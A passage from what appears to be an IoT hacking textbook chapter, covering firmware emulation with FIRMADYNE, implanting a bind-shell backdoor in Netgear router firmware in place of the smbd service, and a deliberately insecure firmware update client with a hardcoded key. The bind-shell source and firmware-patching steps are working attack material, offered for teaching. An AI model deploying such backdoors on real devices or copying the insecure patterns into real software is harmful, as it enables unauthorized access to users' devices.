<p>If the script is successful, the final lines of the output will contain a message indicating that it found the Linux filesystem <span class="CodeAnnotation">2</span>. The <code>1</code> tag <span class="CodeAnnotation">1</span> indicates that the extracted images are located at <em>./images/1.tar.gz</em>. </p>
<p>Use the <em>getArch.sh</em> script to automatically identify the firmware’s architecture and store it in the FIRMADYNE database:</p>
<pre><code>$ <b>./scripts/getArch.sh ./images/1.tar.gz</b>
./bin/busybox: mipseb</code></pre>
<p>FIRMADYNE identified the <code>mipseb</code> executable format, which corresponds to MIPS big-endian systems. You should have expected this output, because we got the same result when we used the <code>file</code> command in “Binary Emulation” on page 217 to analyze the header of a single binary.</p>
<p>Now we’ll use the <em>tar2db.py</em> and <em>makeImage.sh</em> scripts to store information from the extracted image in the database and generate a QEMU image that we can emulate.</p>
<pre><code>$<b>./</b><b>scripts/tar2db.py -</b><b>i</b><b> 1 -f ./images/1.tar.gz</b>
$./<b>scripts/makeImage.sh 1</b>
Querying database for architecture... Password for user firmadyne: 
mipseb
…
Removing /etc/scripts/sys_resetbutton!
----Setting up FIRMADYNE----
----Unmounting QEMU Image----
loop deleted : /dev/loop0</code></pre>
<p>We provide the tag name with the <code>-i </code>parameter and the location of the extracted firmware with the <code>–f</code> parameter. </p>
<p>We also have to set up the host device so it can access and interact with the emulated device’s network interfaces. This means that we need to configure an IPv4 address and the proper network routes. The <em>inferNetwork.sh</em> script can automatically detect the appropriate settings:</p>
<pre><code>$ <b>./scripts/inferNetwork.sh 1</b>
Querying database for architecture... Password for user firmadyne: 
mipseb
Running firmware 1: terminating after 60 secs...
qemu-system-mips: terminating on signal 2 from pid 6215 (timeout)
<span epub:type="pagebreak" title="221" id="Page_221"/>Inferring network...
Interfaces: [('br0', <b>'192.168.1.1'</b>)]
Done!</code></pre>
<p>FIRMADYNE successfully identified an interface with the IPv4 address <code>192.168.1.1</code> in the emulated device. Additionally, to begin the emulation and set up the host device’s network configuration, use the <em>run.sh</em> script, which is automatically created in the <em>./scratch/1/</em><code/>folder:</p>
<pre><code>$ <b>./scratch/1/run.sh</b>
Creating TAP device tap1_0...
Set 'tap1_0' persistent and owned by uid 0
Bringing up TAP device...
Adding route to 192.168.1.1...
Starting firmware emulation... use Ctrl-a + x to exit
[    0.000000] Linux version 2.6.32.70 (vagrant@vagrant-ubuntu-trusty-64) (gcc version 5.3.0 (GCC) ) #1 Thu Feb 18 01:39:21 UTC 2016
[    0.000000] 
[    0.000000] LINUX started...
…
Please press Enter to activate this console. 
tc login:<b>admin</b>
Password: 
# </code></pre>
<p>A login prompt should appear. You should be able to authenticate using the set of credentials discovered in “Finding Credentials in Configuration Files” on page 215.</p>
<h3 id="h2-500907c09-0004">Dynamic Analysis</h3>
<p class="BodyFirst">You can now use the firmware as though it were your host device. Although we won’t walk through a complete dynamic analysis here, we’ll give you some ideas of where to start. For example, you can list the firmware’s <em>rootfs</em> files using the <code>ls</code> command. Because you’ve emulated the firmware, you might discover files that were generated after the device booted and didn’t exist during the static analysis phase.</p>
<pre><code>$<b> ls</b>
bin               firmadyne         lost+found        tmp
boaroot           firmware_version  proc              userfs
dev               lib               sbin              usr
etc               linuxrc           sys               var</code></pre>
<p>Look through these directories. For example, in the <em>etc </em>directory, the <em>/etc/passwd</em> file maintains the authentication details in Unix-based systems. You can use it to verify the existence of the accounts you identified during static analysis.</p>
<pre><code>$ <b>cat /</b><b>etc</b><b>/passwd </b>
admin:$1$$I2o9Z7NcvQAKp7wyCTlia0:0:0:root:/:/bin/sh
qwertyuiopqwertyuiopqwertyuiopqwertyuiopqwertyuiopqwertyuiopqwertyuiopqwerty</code></pre>
<span epub:type="pagebreak" title="222" id="Page_222"/>uiopqwertyuiopqwertyuiopqwertyuiopqwertyuiopqwertyui:$1$$MJ7v7GdeVaM1xIZdZYKzL1:0:0:root:/:/bin/sh
<pre><code>anonymous:$1$$D3XHL7Q5PI3Ut1WUbrnz20:0:0:root:/:/bin/sh</code></pre>
<p>Next, it’s important to identify the network services and established connections, because you might identify services that you could use for further exploitation at a later stage. You can do this using the <code>netstat</code> command:</p>
<pre><code>$ <b>netstat -a -n -u -t</b>
Active Internet connections (servers and established)
Proto Recv-Q Send-Q Local Address           Foreign Address         State      
tcp        0      0 0.0.0.0:3333            0.0.0.0:*               LISTEN      
tcp        0      0 0.0.0.0:139             0.0.0.0:*               LISTEN      
tcp        0      0 0.0.0.0:53              0.0.0.0:*               LISTEN      
tcp        0      0 192.168.1.1:23          0.0.0.0:*               LISTEN      
tcp        0      0 0.0.0.0:445             0.0.0.0:*               LISTEN      
tcp        0      0 :::80                   :::*                    LISTEN      
tcp        0      0 :::53                   :::*                    LISTEN      
tcp        0      0 :::443                  :::*                    LISTEN      
udp        0      0 192.168.1.1:137         0.0.0.0:*                           
udp        0      0 0.0.0.0:137             0.0.0.0:*                           
udp        0      0 192.168.1.1:138         0.0.0.0:*                           
udp        0      0 0.0.0.0:138             0.0.0.0:*                           
udp        0      0 0.0.0.0:50851           0.0.0.0:*                           
udp        0      0 0.0.0.0:53              0.0.0.0:*                           
udp        0      0 0.0.0.0:67              0.0.0.0:*                           
udp        0      0 :::53                   :::*                                
udp        0      0 :::69                   :::*                      </code></pre>
<p>The <code>-a</code> parameter requests listening and nonlistening network sockets (the combination of an IP address and a port). The <code>-n</code> parameter displays the IP addresses in a numeric format. The <code>-u</code> and <code>-t</code> parameters return both UDP and TCP sockets. The output indicates the existence of an HTTP server at port 80 and 443 that is waiting for connections.</p>
<p>To access network services from the host device, you might have to disable any existing firewall implementations in the firmware. On Linux platforms, these implementations are usually based on <code>iptables</code>, a command line utility that allows you to configure a list of IP packet-filter rules in the Linux kernel. Each rule lists certain network connection attributes, such as the used port, source IP address, and destination IP address, and states whether a network connection with those attributes should be allowed or blocked. If a new network connection doesn’t match any rules, the firewall uses a default policy. To disable any <code>iptables</code>-based firewall, change the default policies to accept all connections and then clear any existing rules using the following commands:</p>
<pre><code>$ <b>iptables --policy INPUT ACCEPT</b>
$ <b>iptables --policy FORWARD ACCEPT</b>
$ <b>iptables --policy OUTPUT ACCEPT</b>
$ <b>iptables -F</b></code></pre>
<p><span epub:type="pagebreak" title="223" id="Page_223"/>Now try navigating to the device’s IP address using your browser to access the web app hosted by the firmware (<a id="figureanchor9-3" href="#figure9-3">Figure 9-3</a>).</p>
<figure>
<img src="Images/f09003.png" alt="f09003" width="646" height="482"/>
<figcaption><p><a id="figure9-3">Figure 9-3:</a> The firmware’s web app</p></figcaption>
</figure>
<p>You might not be able to access all of the firmware’s HTTP pages, because many of them require feedback from specialized hardware components, such as the Wi-Fi, Reset, and WPS buttons. It’s likely that FIRMADYNE won’t automatically detect and emulate all these components, and as a result, the HTTP server might crash. You might need to restart the firmware’s HTTP server multiple times to access certain pages. We leave this as an exercise for you to complete.</p>
<p>We won’t cover network attacks in this chapter, but you can use the information in Chapter 4 to identify vulnerabilities in the network stack and services. Begin by assessing the device’s HTTP service. For example, the source code of the publicly accessible page <em>/cgi-bin/passrec.asp</em> contains the administrator’s password. Netgear has published this vulnerability at <a href="https://kb.netgear.com/30490/CVE-2015-8289-Authentication-Bypass-Using-an-Alternate-Path-or-Channel/" class="LinkURL">https://kb.netgear.com/30490/CVE-2015-8289-Authentication-Bypass-Using-an-Alternate-Path-or-Channel/</a>.</p>
<h2 id="h1-500907c09-0004">Backdooring Firmware</h2>
<p class="BodyFirst">A <em>backdoor agent</em> is software hidden inside a computing device that allows an attacker to gain unauthorized access to the system. In this section, we’ll modify a firmware by adding a tiny backdoor that will execute when the firmware boots up, providing the attacker with a shell from the victim device. Also, the backdoor will allow us to perform dynamic analysis with root privileges in a real and functional device. This approach is extremely helpful in cases when FIRMADYNE can’t correctly emulate all firmware functionalities. </p>
<p><span epub:type="pagebreak" title="224" id="Page_224"/>As a backdoor agent, we’ll use a simple bind shell written in C by Osanda Malith (<a id="listinganchor9-1" href="#listing9-1">Listing 9-1</a>). This script listens for new incoming connections to a predefined network port and allows remote code execution. We’ve added a <code>fork()</code> command to the original script to make it work in the background. This will create a new child process, which runs concurrently in background, while the parent process simply terminates and prevents the calling program from halting.</p>
<pre><code>#include &lt;stdio.h&gt;
#include &lt;stdlib.h&gt;
#include &lt;string.h&gt;
#include &lt;sys/types.h&gt;
#include &lt;sys/socket.h&gt;
#include &lt;netinet/in.h&gt;

#define SERVER_PORT	9999
 /* CC-BY: Osanda Malith Jayathissa (@OsandaMalith)
  * Bind Shell using Fork for my TP-Link mr3020 router running busybox
  * Arch : MIPS
  * mips-linux-gnu-gcc mybindshell.c -o mybindshell -static -EB -march=24kc
  */
int main() {
        int serverfd, clientfd, server_pid, i = 0;
        char *banner = "[~] Welcome to @OsandaMalith's Bind Shell\n";
        char *args[] = { "/bin/busybox", "sh", (char *) 0 };
        struct sockaddr_in server, client;
        socklen_t len;
<b>int x = </b><b>fork(</b><b>);</b>
<b>    </b><b>    </b><b>if (x == </b><b>0){</b>
        server.sin_family = AF_INET;
        server.sin_port = htons(SERVER_PORT);
        server.sin_addr.s_addr = INADDR_ANY; 

        serverfd = socket(AF_INET, SOCK_STREAM, 0);
        bind(serverfd, (struct sockaddr *)&amp;server, sizeof(server));
        listen(serverfd, 1);

    while (1) { 
        len = sizeof(struct sockaddr);
        clientfd = accept(serverfd, (struct sockaddr *)&amp;client, &amp;len);
        server_pid = fork(); 
        if (server_pid) { 
            write(clientfd, banner,  strlen(banner));
            for(; i &lt;3 /*u*/; i++) dup2(clientfd, i);
            execve("/bin/busybox", args, (char *) 0);
            close(clientfd); 
        } close(clientfd);
    }<b> </b>
<b> }</b>
<b> </b>return 0;
}</code></pre>
<p class="CodeListingCaption"><a id="listing9-1">Listing 9-1:</a> A modified version of Osanda Malith’s backdooring script (<a href="https://github.com/OsandaMalith/TP-Link/blob/master/bindshell.c" class="LinkURL">https://github.com/OsandaMalith/TP-Link/blob/master/bindshell.c</a>)</p>
<p><span epub:type="pagebreak" title="225" id="Page_225"/>Once executed, the script will start listening on port 9999 and execute any input received through that port as a system command. </p>
<p>To compile the backdoor agent, we first need to set up the compilation environment. The easiest way is to use the OpenWrt project’s frequently updated toolchain.</p>
<pre><code>$ <b>git clone https://github.com/openwrt/openwrt</b>
$ <b>cd </b><b>openwrt</b>
$ <b>.</b><b>/scripts/feeds update -a</b>
$ <b>.</b><b>/scripts/feeds install -a</b>
$ <b>make </b><b>menuconfig</b></code></pre>
<p>By default, these commands will compile the firmware for the Atheros AR7 type of System on a Chip (SoC) routers, which are based on MIPS processors. To set a different value, click <b>Target System</b> and choose one of the available Atheros AR7 devices (<a id="figureanchor9-4" href="#figure9-4">Figure 9-4</a>). </p>
<figure>
<img src="Images/f09004.png" alt="f09004" width="700" height="348"/>
<figcaption><p><a id="figure9-4">Figure 9-4:</a> Reconfiguring the OpenWrt build target environment</p></figcaption>
</figure>
<p>Then save your changes to a new configuration file by clicking the <b>SAVE</b> option, and exit from the menu by clicking the <b>EXIT</b> option (<a id="figureanchor9-5" href="#figure9-5">Figure 9-5</a>).</p>
<figure>
<img src="Images/f09005.png" alt="f09005" width="654" height="324"/>
<figcaption><p><a id="figure9-5">Figure 9-5:</a> Selecting the Atheros target in the OpenWrt settings</p></figcaption>
</figure>
<p><span epub:type="pagebreak" title="226" id="Page_226"/>Next, compile the toolchain using the <code>make</code> command:</p>
<pre><code>$ <b>make toolchain/install</b><b> </b>
time: target/linux/prereq#0.53#0.11#0.63
make[1] toolchain/install
make[2] tools/compile
make[3] -C tools/flock compile
…</code></pre>
<p>In OpenWrt’s <em>staging_dir/toolchain-mips_24kc_gcc-8.3.0_musl/bin/</em> folder, you’ll find the <em>mips-openwrt-linux-gcc</em> compiler, which you can use as follows: </p>
<pre><code>$ <b>export STAGING_DIR="/root/Desktop/</b><b>mips_backdoor</b><b>/</b><b>openwrt</b><b>/</b><b>staging_dir</b><b>"</b>
$ <b>./openwrt/staging_dir/toolchain-mips_24kc_gcc-8.3.0_musl/bin/mips-openwrt-linux-gcc </b><b>bindshell.c</b><b> -o </b><b>bindshell</b><b> </b><b>-static -EB -march=24kc</b></code></pre>
<p>This should output a binary named <em>bindshell</em>. Transfer the binary to the emulated firmware using FIRMADYNE and verify that it works correctly. You can do this easily by using Python to create a mini web server in the folder that the binary is in:</p>
<pre><code>$ <b>p</b><b>ython -m </b><b>SimpleHTTPServer</b><b> 8080 /</b></code></pre>
<p>Then, in the emulated firmware, download the binary using the <code>wget</code> command:</p>
<pre><code>$ <b>wget</b><b> http://192.168.1.2:8080/bindshell</b>
Connecting to 192.168.1.2[192.168.1.2]:80
bindshell 100% |*****************************| 68544       00:00 ETA
$ <b>chmod</b><b> +</b><b>x .</b><b>/</b><b>bindshell</b>
$ <b>.</b><b>/</b><b>bindshell</b></code></pre>
<p>To verify that the backdoor agent works, attempt to connect to it from your host device using Netcat. An interactive shell should appear.</p>
<pre><code>$ <b>nc</b><b> 192.168.1.1 9999</b>
[~] Welcome to @OsandaMalith's Bind Shell
ls -l
drwxr-xr-x    2 0        0            4096 bin
drwxr-xr-x    4 0        0            4096 boaroot
drwxr-xr-x    6 0        0            4096 dev
…</code></pre>
<p>At this stage, we need to patch the firmware so we can redistribute it. For this purpose, we can use the open source project <em>firmware-mod-kit</em>. Start by installing the necessary system packages using <code>apt-get</code>:</p>
<pre><code>$ <b>sudo</b><b> apt-get install git build-essential zlib1g-dev </b><b>liblzma</b><b>-dev python-magic </b><b>bsdmainutils</b></code></pre>
<p>Then use the <code>git</code> command to download the application from the GitHub repository. This repository hosts a forked version of the application, <span epub:type="pagebreak" title="227" id="Page_227"/>because the original is no longer maintained. The application folder contains a script named <em>./extract-firmware.sh</em><code/>that you can use to extract the firmware using a process similar to FIRMADYNE.</p>
<pre><code>$ <b>git clone https://github.com/rampageX/firmware-mod-kit</b>
$ <b>cd firmware-mod-kit</b>
$ <b>./extract-firmware.sh D6000-V1.0.0.41_1.0.1.bin </b>
Firmware Mod Kit (extract) 0.99, (c)2011-2013 Craig Heffner, Jeremy Collake
Preparing tools ...
…
Extracting 1418962 bytes of  header image at offset 0
Extracting squashfs file system at offset 1418962
Extracting 2800 byte footer from offset 9668730
Extracting squashfs files...
Firmware extraction successful!
Firmware parts can be found in '/root/Desktop/firmware-mod-kit/fmk/*'</code></pre>
<p>For the attack to be successful, the firmware should replace an existing binary that runs automatically, guaranteeing that any normal use of the device will trigger the backdoor. During the dynamic analysis phase, we indeed identified a binary like that: an SMB service running at port 445. You can find the <em>smbd</em> binary in the <em>/userfs/bin/smbd</em> directory. Let’s replace it with the bindshell: </p>
<pre><code>$ <b>cp bindshell /userfs/bin/smbd</b></code></pre>
<p>After replacing the binary, reconstruct the firmware using the <code>build-firmware</code> script:</p>
<pre><code>$ <b>./build-firmware.sh</b>
firmware Mod Kit (build) 0.99, (c)2011-2013 Craig Heffner, Jeremy Collake
Building new squashfs file system... (this may take several minutes!)
Squashfs block size is 128 Kb
…
Firmware header not supported; firmware checksums may be incorrect. 
New firmware image has been saved to: /root/Desktop/firmware-mod-kit/fmk/new-firmware.bin</code></pre>
<p>Then use <code>firmadyne</code> to verify that when the firmware boots, the bindshell is still working. Using <code>netstat</code>, you can verify that the firmware’s SMB service, which normally listens for new connections at port 445, has been replaced with the backdoor agent, which listens for new connections on port 9999:</p>
<pre><code>$ <b>netstat -a -n -u -t</b>
Active Internet connections (servers and established)
Proto Recv-Q Send-Q Local Address           Foreign Address         State      
tcp        0      0 0.0.0.0:3333            0.0.0.0:*               LISTEN      
<code>tcp        0      0 0.0.0.0:9999            0.0.0.0:*</code>               LISTEN      
tcp        0      0 0.0.0.0:53              0.0.0.0:*               LISTEN      
tcp        0      0 192.168.1.1:23          0.0.0.0:*               LISTEN      
tcp        0      0 :::80                   :::*                    LISTEN      
tcp        0      0 :::53                   :::*                    LISTEN      
tcp        0      0 :::443                  :::*                    LISTEN      
udp        0      0 0.0.0.0:57218           0.0.0.0:*                           
<span epub:type="pagebreak" title="228" id="Page_228"/>udp        0      0 192.168.1.1:137         0.0.0.0:*                           
udp        0      0 0.0.0.0:137             0.0.0.0:*                           
udp        0      0 192.168.1.1:138         0.0.0.0:*                           
udp        0      0 0.0.0.0:138             0.0.0.0:*                           
udp        0      0 0.0.0.0:53              0.0.0.0:*                           
udp        0      0 0.0.0.0:67              0.0.0.0:*                           
udp        0      0 :::53                   :::*                                
udp        0      0 :::69                   :::*                                </code></pre>
<p>Instead of replacing the binary, you could patch the binary to provide the legitimate functionality and the bindshell. This would make users less likely to detect the backdoor. We leave this as an exercise for you to complete.</p>
<h2 id="h1-500907c09-0005">Targeting Firmware Update Mechanisms</h2>
<p class="BodyFirst">A firmware’s update mechanism is a significant attack vector and is one of the top 10 IoT vulnerabilities according to OWASP. The <em>firmware update mechanism</em> is the process that fetches a newer version of the firmware, whether through the vendor’s website or an external device such as a USB drive, and installs it by replacing the earlier version. These mechanisms can introduce a range of security problems. They often fail to validate the firmware or use unencrypted network protocols; some lack anti-rollback mechanisms or don’t notify the end user about any security changes that resulted from the update. The update process might also exacerbate other problems in the device, such as the use of hardcoded credentials, an insecure authentication to the cloud component that hosts the firmware, and even excessive and insecure logging. </p>
<p>To teach you about all these issues, we’ve created a deliberately vulnerable firmware update service. This service consists of an emulated IoT device that fetches firmware from an emulated cloud update service. You can download the files for this exercise from the book’s website at <a href="https://nostarch.com/practical-iot-hacking/" class="LinkURL">https://nostarch.com/practical-iot-hacking/</a>. This update service might be included in the future as part of IoTGoat, a deliberately insecure firmware based on OpenWrt whose goal is to teach users about common vulnerabilities in IoT devices. The authors of this book contribute to that project.</p>
<p>To deliver the new firmware file, the server will listen on TCP port <code>31337</code>. The client will connect to the server on that port and authenticate using a preshared hardcoded key. The server will then send the following to the client, in order: the firmware length, an MD5 hash of the firmware file, and the firmware file. The client will verify the integrity of the firmware file by comparing the received MD5 hash with a hash of the firmware file, which it calculates using the same preshared key (which it used to authenticate earlier). If the two hashes match, it writes the received firmware file to the current directory as <em>received_firmware.gz</em>. </p>
<h3 id="h2-500907c09-0005"><span epub:type="pagebreak" title="229" id="Page_229"/>Compilation and Setup </h3>
<p class="BodyFirst">Although you can run the client and the server on the same host, ideally you would run them on separate hosts to mimic a real update process. So we recommend compiling and setting up the two components on separate Linux systems. In this demonstration, we’ll use Kali Linux for the update server and Ubuntu for the IoT client, but you should be able to use any Linux distribution, as long as you’ve installed the proper dependencies. Install the following packages on both machines:</p>
<pre><code># <b>apt-get install build-essential </b><b>libssl</b><b>-dev</b></code></pre>
<p>Navigate to the client directory and use the <em>makefile</em> included there to compile the client program by entering the following: </p>
<pre><code>$ <b>make client</b></code></pre>
<p>This should create the executable <em>client </em>file on the current directory<em>.</em> Next, compile the server on the second machine. Navigate to the directory where the <em>makefile</em> and <em>server.c</em> reside and compile them by entering this command:</p>
<pre><code>$ <b>make server</b></code></pre>
<p>We won’t analyze the server code, because in a real security assessment, you’d most likely only have access to the client binary (not even the source code!) from the firmware filesystem. But for educational purposes, we’ll examine the client’s source code to shed some light on the underlying vulnerabilities.</p>
<h3 id="h2-500907c09-0006">The Client Code</h3>
<p class="BodyFirst">Now let’s look at the client code. This program, written in C, is available at <a href="https://nostarch.com/practical-iot-hacking/" class="LinkURL">https://nostarch.com/practical-iot-hacking/</a>. We’ll highlight only the important parts: </p>
<pre><code>#define PORT 31337
#define FIRMWARE_NAME "./received_firmware.gz"
#define KEY "jUiq1nzpIOaqrWa8R21"</code></pre>
<p>The <code>#define</code> directives define constant values. We first define the server port on which the update service will be listening. Next, we specify a name for the received firmware file. Then we hardcode an authentication key that has already been shared with the server. Using hardcoded keys is a security problem, as we’ll explain later.</p>
<p>We’ve split the code from the client’s <code>main()</code> function into two separate listings for better clarity. <a id="listinganchor9-2" href="#listing9-2">Listing 9-2</a> is the first part.</p>
<span epub:type="pagebreak" title="230" id="Page_230"/><pre><code>int main(int argc, char **argv) {
  struct sockaddr_in servaddr;
  int sockfd, filelen, remaining_bytes;
  ssize_t bytes_received;
  size_t offset;
  unsigned char received_hash[16], calculated_hash[16];
  unsigned char *hash_p, *fw_p;
  unsigned int hash_len;
  uint32_t hdr_fwlen;
  char server_ip[16] = "127.0.0.1"; <span class="CodeAnnotation">1</span>
  FILE *file;

  if (argc &gt; 1) <span class="CodeAnnotation">2</span>
    strncpy((char *)server_ip, argv[1], sizeof(server_ip) - 1);

  openlog("firmware_update", LOG_CONS | LOG_PID | LOG_NDELAY, LOG_LOCAL1);
  syslog(LOG_NOTICE, "firmware update process started with PID: %d", getpid());

  memset(&amp;servaddr, 0, sizeof(servaddr)); <span class="CodeAnnotation">3</span>
  servaddr.sin_family = AF_INET;
  inet_pton(AF_INET, server_ip, &amp;(servaddr.sin_addr));
  servaddr.sin_port = htons(PORT);
  if ((sockfd = socket(AF_INET, SOCK_STREAM, 0)) &lt; 0)
    fatal("Could not open socket %s\n", strerror(errno));

  if (connect(sockfd, (struct sockaddr *)&amp;servaddr, sizeof(struct sockaddr)) == -1)
    fatal("Could not connect to server %s: %s\n", server_ip, strerror(errno));

  /* send the key to authenticate */
  write(sockfd, &amp;KEY, sizeof(KEY)); <span class="CodeAnnotation">4</span>
  syslog(LOG_NOTICE, "Authenticating with %s using key %s", server_ip, KEY);

  /* receive firmware length */
  recv(sockfd, &amp;hdr_fwlen, sizeof(hdr_fwlen), 0); <span class="CodeAnnotation">5</span>
  filelen = ntohl(hdr_fwlen);
  printf("filelen: %d\n", filelen);</code></pre>
<p class="CodeListingCaption"><a id="listing9-2">Listing 9-2:</a> The first half of the insecure firmware update client’s <code>main(</code><code>)</code> function</p>
<p>The main function begins by defining variables for networking purposes and to store values used throughout the program. We won’t explain the network programming part of the code in detail. Rather, we’ll focus on the high-level functionality. Notice the <code>server_ip</code> variable <span class="CodeAnnotation">1</span>, which stores the server’s IP address as a null-terminated C string. If the user doesn’t specify any argument in the command line when starting the client, the IP address will default to the localhost (<code>127.0.0.1</code>). Otherwise, we copy the first argument, <code>argv[1]</code> (because <code>argv[0]</code> is always the program’s filename), to the <code>server_ip</code><span class="CodeAnnotation">2</span>. Next, we open a connection to the system logger  and instruct it to prepend all messages it receives in the future with the <code>firmware_update </code>keyword,<code/>followed by the caller’s process identifier (PID). From then on, every time the program calls the <code>syslog</code> function, it sends messages to the <em>/var/log/messages</em> file—the general system activity log, which is typically used for noncritical, nondebugging messages.</p>
<p><span epub:type="pagebreak" title="231" id="Page_231"/>The next code block prepares the TCP socket (through the socket descriptor <code>sockfd</code>) <span class="CodeAnnotation">3</span> and initiates the TCP connection to the server. If the server is listening on the other end, the client will successfully conduct the TCP three-way handshake. It can then begin sending or receiving data through the socket. </p>
<p>The client then authenticates to the server by sending the <code>KEY</code> value defined earlier <span class="CodeAnnotation">4</span>. It sends another message to <code>syslog</code>  indicating that it’s trying to authenticate using this key. This action is an example of two insecure practices: excessive logging and the inclusion of sensitive information in log files. The preshared secret key is now written to a log that unprivileged users might be able to access. You can read more about these issues at <a href="https://cwe.mitre.org/data/definitions/779.html" class="LinkURL">https://cwe.mitre.org/data/definitions/779.html</a><em> </em>and <a href="https://cwe.mitre.org/data/definitions/532.html" class="LinkURL">https://cwe.mitre.org/data/definitions/532.html</a>. </p>
<p>After the client authenticates successfully, it waits to receive the firmware length from the server, storing that value in <code>hdr_fwlen</code>, and then converts it from network-byte order to host-byte order by calling <code>ntohl </code><span class="CodeAnnotation">5</span>. </p>
<p><a id="listinganchor9-3" href="#listing9-3">Listing 9-3</a> shows the second part of the main function.</p>
<pre><code>  /* receive hash */
  recv(sockfd, received_hash, sizeof(received_hash), 0); <span class="CodeAnnotation">1</span>

  /* receive file */
  if (!(fw_p = malloc(filelen))) <span class="CodeAnnotation">2</span>
    fatal("cannot allocate memory for incoming firmware\n");

  remaining_bytes = filelen;
  offset = 0;
  while (remaining_bytes &gt; 0) {
    bytes_received = recv(sockfd, fw_p + offset, remaining_bytes, 0);
    offset += bytes_received; 
    remaining_bytes -= bytes_received;
#ifdef DEBUG
    printf("Received bytes %ld\n", bytes_received);
#endif
  }

  /* validate firmware by comparing received hash and calculated hash */
  hash_p = calculated_hash;
  hash_p = HMAC(EVP_md5(), &amp;KEY, sizeof(KEY) - 1, fw_p, filelen, hash_p, &amp;hash_len); <span class="CodeAnnotation">3</span>

  printf("calculated hash: ");
  for (int i = 0; i &lt; hash_len; i++)
    printf("%x", hash_p[i]);
  printf("\nreceived hash: ");
  for (int i = 0; i &lt; sizeof(received_hash); i++)
    printf("%x", received_hash[i]);
  printf("\n");

  if (!memcmp(calculated_hash, received_hash, sizeof(calculated_hash))) <span class="CodeAnnotation">4</span>
    printf("hashes match\n");
  else
    fatal("hash mismatch\n");
<span epub:type="pagebreak" title="232" id="Page_232"/>
  /* write received firmware to disk */
  if (!(file = fopen(FIRMWARE_NAME, "w")))
    fatal("Can't open file for writing %s\n", strerror(errno));
  fwrite(fw_p, filelen, 1, file); <span class="CodeAnnotation">5</span>

  syslog(LOG_NOTICE, "Firmware downloaded successfully"); <span class="CodeAnnotation">6</span>
  /* clean up */
  free(fw_p);
  fclose(file);
  close(sockfd);
  closelog();
  return 0;</code></pre>
<p class="CodeListingCaption"><a id="listing9-3">Listing 9-3:</a> The second half of the insecure firmware update client’s <code>main(</code><code>)</code> function</p>
<p>After receiving the firmware length (stored in variable <code>filelen</code>), the client receives the firmware file’s MD5 hash (stored in variable <code>received_hash</code>) <span class="CodeAnnotation">1</span>. Then, based on the firmware length, it allocates enough memory on the heap to receive the firmware file <span class="CodeAnnotation">2</span>. The <code>while</code> loop  gradually receives the firmware file from the server and writes it in that allocated memory. </p>
<p>The client then calculates the firmware file’s MD5 hash (<code>calculated_hash</code>) using the preshared key <span class="CodeAnnotation">3</span>. For debugging purposes, we also print the calculated and received hashes. If the two hashes match <span class="CodeAnnotation">4</span>, the client creates a file in the current directory using a filename taken from the value of <code>FIRMWARE_NAME</code>. It then dumps the firmware <span class="CodeAnnotation">5</span>, which was stored in memory (pointed to by <code>fw_p</code>), to that file on the disk. It sends a final message to <code>syslog</code><span class="CodeAnnotation">6</span> about completing the new firmware download, does some cleanup, and exits. </p>
<aside epub:type="sidebar">
<div class="top hr"><hr/></div>
<section class="note">
<h2><span class="NoteHead">WARNING</span></h2>
<p>Keep in mind that this client was written in a deliberately insecure manner. Don’t use it in a production environment (notice that it even omits error checking for some functions for brevity). Use this only in an isolated, contained lab environment.</p>
<div class="bottom hr"><hr/></div>
</section>
</aside>
<h3 id="h2-500907c09-0007">Running the Update Service</h3>
<p class="BodyFirst">To test the update service, we first execute the server. We do so on an Ubuntu host with the IP address 192.168.10.219. Once the server starts listening, we run the client, passing it the server’s IP address as its first argument. We run the client on a Kali host with the IP address 192.168.10.10:</p>
<pre><code>root@kali:~/firmware_update# <b>ls</b>
client client.c Makefile
root@kali:~/firmware_update# <b>./client 192.168.10.219</b>
filelen: 6665864
calculated hash: d21843d3abed62af87c781f3a3fda52d
received hash: d21843d3abed62af87c781f3a3fda52d
hashes match 
root@kali:~/firmware_update# <b>ls</b>
client client.c Makefile received_firmware.gz</code></pre>
<p><span epub:type="pagebreak" title="233" id="Page_233"/>The client connects to the server and fetches the firmware file. Notice the newly downloaded firmware file in the current directory once the execution completes. The following listing shows the server’s output. Make sure the server is up before you run the client.</p>
<pre><code>user@ubuntu:~/fwupdate$ ./server
Listening on port 31337
Connection from 192.168.10.20
Credentials accepted.
hash: d21843d3abed62af87c781f3a3fda52d
filelen: 6665864</code></pre>
<p> Note that because this is an emulated service, the client doesn’t actually update any firmware after downloading the file. </p>
<h3 id="h2-500907c09-0008">Vulnerabilities of Firmware Update Services</h3>
<p class="BodyFirst">Let’s now inspect the vulnerabilities in this insecure firmware update mechanism. </p>
<h4 id="h3-500907c09-0006">Hardcoded Credentials</h4>
<p class="BodyFirst">First, the client authenticates to the server using a hardcoded password. The use of hardcoded credentials (such as passwords and cryptographic keys) by IoT systems is a huge problem for two reasons: one because of the frequency with which they’re found in IoT devices and the other because of the consequences of their exploitation. Hardcoded credentials are embedded in the binary files rather than in configuration files. This makes it almost impossible for end users or administrators to change them without intrusively modifying the binary files in ways that risk breaking them. Also, if malicious actors ever discover the hardcoded credential by binary analysis or reverse engineering, they can leak it on the internet or in underground markets, allowing anyone to access the endpoint. Another problem is that, more often than not, these hardcoded credentials are the same for each installation of the product, even across different organizations. The reason is that it’s easier for vendors to create one master password or key instead of unique ones for every device. In the following listing, you can see part of the output from running the <code>strings </code>command against the <em>client</em> binary file, which reveals the hardcoded password (highlighted):</p>
<pre><code>QUITTING!
firmware_update
firmware update process started with PID: %d
Could not open socket %s
Could not connect to server %s: %s
<b>jUiq1nzpIOaqrWa8R21</b>
Authenticating with %s using key %s
filelen: %d
cannot allocate memory for incoming firmware
calculated hash: 
received hash: 
<span epub:type="pagebreak" title="234" id="Page_234"/>hashes match
hash mismatch
./received_firmware.gz
Can't open file for writing %s
Firmware downloaded successfully</code></pre>
<p>Attackers could also discover the key by analyzing the server binary file (which would, however, be hosted on the cloud, making it harder to compromise). The client would normally reside on the IoT device, making it much easier for someone to inspect it. </p>
<p>You can read more about hardcoded passwords at <a href="https://cwe.mitre.org/data/definitions/798.html" class="LinkURL">https://cwe.mitre.org/data/definitions/798.html</a>.</p>
<h4 id="h3-500907c09-0007">Insecure Hashing Algorithms</h4>
